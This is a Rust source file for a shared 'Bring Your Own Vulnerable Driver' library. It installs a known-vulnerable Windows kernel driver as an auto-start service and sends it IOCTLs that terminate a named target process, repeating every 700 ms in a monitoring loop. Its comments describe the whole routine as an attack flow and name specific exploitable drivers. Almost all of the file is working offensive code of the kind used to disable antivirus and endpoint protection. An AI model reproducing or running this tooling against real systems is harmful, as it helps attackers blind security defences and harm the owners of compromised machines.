#![allow(non_snake_case)]

//! Shared BYOVD (Bring Your Own Vulnerable Driver) library.
//!
//! Provides common abstractions for loading vulnerable kernel drivers,
//! managing their lifecycle, and dispatching IOCTL requests to terminate processes.

use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::processenv::GetCurrentDirectoryW;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::winnt::{
    HANDLE, SECURITY_MAX_SID_SIZE, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER,
    WinLocalSystemSid,
};
use winapi::um::winsvc::{
    CloseServiceHandle, ControlService, CreateServiceW, DeleteService, OpenSCManagerW,
    OpenServiceW, SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP,
    SERVICE_STATUS, StartServiceW,
};

// ============================================================================
// Types
// ============================================================================

pub type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;

const MAX_PATH: usize = 260;
const MONITOR_INTERVAL_MS: u64 = 700;

// ============================================================================
// RAII Handle Wrappers
// ============================================================================

/// RAII wrapper for Windows SC_HANDLE (service control handles).
/// Automatically calls `CloseServiceHandle` on drop.
pub struct ServiceHandle(SC_HANDLE);

impl ServiceHandle {
    pub fn new(handle: SC_HANDLE) -> Option<Self> {
        if handle.is_null() {
            None
        } else {
            Some(Self(handle))
        }
    }

    pub fn as_raw(&self) -> SC_HANDLE {
        self.0
    }
}

impl Drop for ServiceHandle {
    fn drop(&mut self) {
        // SAFETY: handle is guaranteed non-null from constructor
        unsafe {
            CloseServiceHandle(self.0);
        }
    }
}

/// RAII wrapper for Windows HANDLE (file/device handles).
/// Automatically calls `CloseHandle` on drop.
pub struct FileHandle(HANDLE);

impl FileHandle {
    pub fn new(handle: HANDLE) -> Option<Self> {
        if handle == INVALID_HANDLE_VALUE || handle.is_null() {
            None
        } else {
            Some(Self(handle))
        }
    }

    pub fn as_raw(&self) -> HANDLE {
        self.0
    }
}

impl Drop for FileHandle {
    fn drop(&mut self) {
        // SAFETY: handle is guaranteed valid from constructor
        unsafe {
            CloseHandle(self.0);
        }
    }
}

// ============================================================================
// Driver Configuration Trait
// ============================================================================

/// Trait that each driver PoC implements to define its specific configuration.
///
/// The shared library uses this trait to manage the driver lifecycle and
/// dispatch IOCTL requests. Each implementation defines the driver-specific
/// details: names, paths, IOCTL codes, and buffer formats.
pub trait DriverConfig {
    /// Driver service name (e.g., "BdApiUtil64")
    fn driver_name(&self) -> &str;

    /// Driver .sys filename (e.g., "BdApiUtil64.sys")
    fn driver_file(&self) -> &str;

    /// Device path for CreateFileW (e.g., "\\\\.\\BdApiUtil")
    fn device_path(&self) -> &str;

    /// IOCTL code to send via DeviceIoControl
    fn ioctl_code(&self) -> u32;

    /// Desired access flags for CreateFileW on the device.
    /// Default: SERVICE_ALL_ACCESS (0xF01FF)
    fn device_access(&self) -> u32 {
        SERVICE_ALL_ACCESS
    }

    /// Whether to skip driver unload on cleanup.
    /// Some drivers (e.g., Viragt64) cause BSOD on unload.
    fn skip_unload(&self) -> bool {
        false
    }

    /// Whether to ignore IOCTL error returns.
    /// Some drivers (e.g., NSecKrnl) report error even on success.
    fn ignore_ioctl_error(&self) -> bool {
        false
    }

    /// Build the raw IOCTL input buffer for a given target.
    ///
    /// `pid` is the target process ID.
    /// `process_name` is the target process name (some drivers use name instead of PID).
    fn build_ioctl_input(&self, pid: u32, process_name: &str) -> Vec<u8>;

    /// Expected IOCTL output buffer size in bytes (0 = no output).
    fn ioctl_output_size(&self) -> usize {
        0
    }

    /// Optional pre-flight check before driver initialization.
    /// Use for privilege verification (e.g., LocalSystem requirement).
    fn preflight_check(&self) -> Result<()> {
        Ok(())
    }
}

// ============================================================================
// Driver Manager
// ============================================================================

/// Manages the lifecycle of a kernel driver service:
/// creation, start, stop, and deletion.
pub struct DriverManager {
    _sc_manager: ServiceHandle,
    service: ServiceHandle,
}

impl DriverManager {
    /// Create or open a driver service.
    ///
    /// If `driver_path_override` is provided, it is used as the full path to the .sys file.
    /// Otherwise, the driver file is expected in the current working directory.
    pub fn new(
        driver_name: &str,
        driver_file: &str,
        driver_path_override: Option<&str>,
    ) -> Result<Self> {
        println!("[*] Opening Service Control Manager");

        // SAFETY: standard SCM open call
        let sc_manager = ServiceHandle::new(unsafe {
            OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE)
        })
        .ok_or("Failed to open Service Control Manager")?;

        // Try to open existing service first
        let service = match ServiceHandle::new(unsafe {
            OpenServiceW(
                sc_manager.as_raw(),
                to_wstring(driver_name).as_ptr(),
                SERVICE_ALL_ACCESS,
            )
        }) {
            Some(service) => {
                println!("[!] Service '{}' already exists", driver_name);
                service
            }
            None => {
                println!("[*] Creating service '{}'", driver_name);

                let driver_path = match driver_path_override {
                    Some(path) => path.to_string(),
                    None => {
                        let current_dir = get_current_dir()?;
                        format!("{}\\{}", current_dir, driver_file)
                    }
                };
                println!("[*] Driver path: {}", driver_path);

                // SAFETY: sc_manager handle is valid, strings are null-terminated
                ServiceHandle::new(unsafe {
                    CreateServiceW(
                        sc_manager.as_raw(),
                        to_wstring(driver_name).as_ptr(),
                        to_wstring(driver_name).as_ptr(),
                        SERVICE_ALL_ACCESS,
                        SERVICE_KERNEL_DRIVER,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        to_wstring(&driver_path).as_ptr(),
                        null_mut(),
                        null_mut(),
                        null_mut(),
                        null_mut(),
                        null_mut(),
                    )
                })
                .ok_or("Failed to create service")?
            }
        };

        Ok(Self {
            _sc_manager: sc_manager,
            service,
        })
    }

    /// Start the driver service.
    /// Returns Ok if the service starts or is already running.
    pub fn start(&self) -> Result<()> {
        println!("[*] Starting driver service");

        // SAFETY: service handle is valid
        let result = unsafe { StartServiceW(self.service.as_raw(), 0, null_mut()) };

        if result == 0 {
            let error = std::io::Error::last_os_error();
            // ERROR_SERVICE_ALREADY_RUNNING = 1056
            if error.raw_os_error() == Some(1056) {
                println!("[!] Driver already running");
                return Ok(());
            }
            return Err(format!("Failed to start service: {}", error).into());
        }

        println!("[+] Driver started successfully");
        Ok(())
    }

    /// Stop the driver service and mark it for deletion.
    pub fn stop(&self) -> Result<()> {
        println!("[*] Stopping driver service");

        let mut status: SERVICE_STATUS = unsafe { mem::zeroed() };

        // SAFETY: service handle is valid, status is properly allocated
        unsafe {
            ControlService(
                self.service.as_raw(),
                SERVICE_CONTROL_STOP,
                &mut status,
            );

            if DeleteService(self.service.as_raw()) != 0 {
                println!("[+] Service marked for deletion");
            } else {
                println!("[!] Failed to delete service (may require reboot)");
            }
        }

        Ok(())
    }
}

// ============================================================================
// IOCTL Dispatch
// ============================================================================

/// Send an IOCTL to the driver device to terminate a target process.
pub fn send_ioctl(config: &dyn DriverConfig, pid: u32, process_name: &str) -> Result<()> {
    // SAFETY: device_path is null-terminated via to_wstring
    let driver_handle = FileHandle::new(unsafe {
        CreateFileW(
            to_wstring(config.device_path()).as_ptr(),
            config.device_access(),
            0,
            null_mut(),
            OPEN_EXISTING,
            0,
            null_mut(),
        )
    })
    .ok_or("Failed to open driver device")?;

    let input = config.build_ioctl_input(pid, process_name);
    let output_size = config.ioctl_output_size();
    let mut output_buffer = vec![0u8; if output_size > 0 { output_size } else { 4 }];
    let mut bytes_returned: DWORD = 0;

    // SAFETY: driver_handle is valid, input/output buffers are properly sized
    let success = unsafe {
        DeviceIoControl(
            driver_handle.as_raw(),
            config.ioctl_code(),
            input.as_ptr() as LPVOID,
            input.len() as DWORD,
            if output_size > 0 {
                output_buffer.as_mut_ptr() as LPVOID
            } else {
                null_mut()
            },
            output_size as DWORD,
            &mut bytes_returned,
            null_mut(),
        )
    };

    if success == 0 && !config.ignore_ioctl_error() {
        return Err("IOCTL call failed".into());
    }

    Ok(())
}

// ============================================================================
// Monitor Loop
// ============================================================================

/// Run the process monitoring loop.
///
/// Continuously scans for a target process by name and sends the kill IOCTL
/// when found. Runs until Ctrl+C is pressed.
pub fn run_monitor(config: &dyn DriverConfig, process_name: &str) -> Result<()> {
    let running = Arc::new(AtomicBool::new(true));
    let running_clone = running.clone();

    ctrlc::set_handler(move || {
        println!("\n[!] Shutting down...");
        running_clone.store(false, Ordering::SeqCst);
    })?;

    println!(
        "[*] Monitoring for process: {} (Press Ctrl+C to stop)\n",
        process_name
    );

    while running.load(Ordering::SeqCst) {
        if let Some(pid) = get_pid_by_name(process_name) {
            match send_ioctl(config, pid, process_name) {
                Ok(_) => println!("[+] Terminated PID: {}", pid),
                Err(e) => eprintln!("[X] Failed to kill PID {}: {}", pid, e),
            }
        }

        thread::sleep(Duration::from_millis(MONITOR_INTERVAL_MS));
    }

    Ok(())
}

// ============================================================================
// Full BYOVD Run
// ============================================================================

/// Execute the full BYOVD attack flow:
/// 1. Run preflight checks
/// 2. Load and start the vulnerable driver
/// 3. Monitor and kill the target process
/// 4. Clean up (stop/delete the driver service)
pub fn run(
    config: &dyn DriverConfig,
    process_name: &str,
    driver_path: Option<&str>,
) -> Result<()> {
    // Pre-flight checks (e.g., privilege verification)
    config.preflight_check()?;

    // Initialize and start driver
    let driver = DriverManager::new(config.driver_name(), config.driver_file(), driver_path)?;
    driver.start()?;

    // Run monitoring loop
    run_monitor(config, process_name)?;

    // Cleanup
    if !config.skip_unload() {
        println!("\n[*] Cleaning up...");
        driver.stop()?;
    } else {
        println!("\n[!] Skipping driver unload (driver does not support safe unload)");
    }

    println!("[+] Done");
    Ok(())
}

// ============================================================================
// Utility Functions
// ============================================================================

/// Convert a Rust string to a null-terminated wide string (UTF-16).
pub fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

/// Get the current working directory as a String.
pub fn get_current_dir() -> Result<String> {
    let mut buf = vec![0u16; MAX_PATH];
    // SAFETY: buffer is properly sized
    let len = unsafe { GetCurrentDirectoryW(buf.len() as u32, buf.as_mut_ptr()) };

    if len == 0 {
        return Err("Failed to get current directory".into());
    }

    buf.truncate(len as usize);
    Ok(String::from_utf16_lossy(&buf))
}

/// Find a process by name and return its PID.
/// Comparison is case-insensitive.
pub fn get_pid_by_name(process_name: &str) -> Option<u32> {
    // SAFETY: standard snapshot creation
    let snapshot = FileHandle::new(unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) })?;

    let mut entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    // SAFETY: snapshot is valid, entry is properly initialized with dwSize
    if unsafe { Process32First(snapshot.as_raw(), &mut entry) } == 0 {
        return None;
    }

    let target = process_name.to_lowercase();

    loop {
        // SAFETY: szExeFile is a null-terminated C string
        let current = unsafe { CStr::from_ptr(entry.szExeFile.as_ptr()) }
            .to_string_lossy()
            .to_lowercase();

        if current == target {
            return Some(entry.th32ProcessID);
        }

        // SAFETY: snapshot and entry remain valid
        if unsafe { Process32Next(snapshot.as_raw(), &mut entry) } == 0 {
            break;
        }
    }

    None
}

/// Verify the current process is running as LocalSystem (S-1-5-18).
/// Returns an error if not running as LocalSystem.
pub fn ensure_running_as_local_system() -> Result<()> {
    use winapi::um::securitybaseapi::{CheckTokenMembership, CreateWellKnownSid};

    let mut sid = [0u8; SECURITY_MAX_SID_SIZE as usize];
    let mut sid_size = sid.len() as DWORD;

    // SAFETY: sid buffer is large enough for any well-known SID
    let created = unsafe {
        CreateWellKnownSid(
            WinLocalSystemSid,
            null_mut(),
            sid.as_mut_ptr() as *mut _,
            &mut sid_size,
        )
    };

    if created == 0 {
        return Err("Failed to build LocalSystem SID".into());
    }

    let mut is_member: i32 = 0;

    // SAFETY: SID was successfully created, is_member is valid out pointer
    let checked = unsafe {
        CheckTokenMembership(null_mut(), sid.as_mut_ptr() as *mut _, &mut is_member)
    };

    if checked == 0 {
        return Err("Failed to verify token membership".into());
    }

    if is_member == 0 {
        return Err("Not running as LocalSystem (S-1-5-18). Use PsExec or similar.".into());
    }

    println!("[+] Running as LocalSystem confirmed");
    Ok(())
}
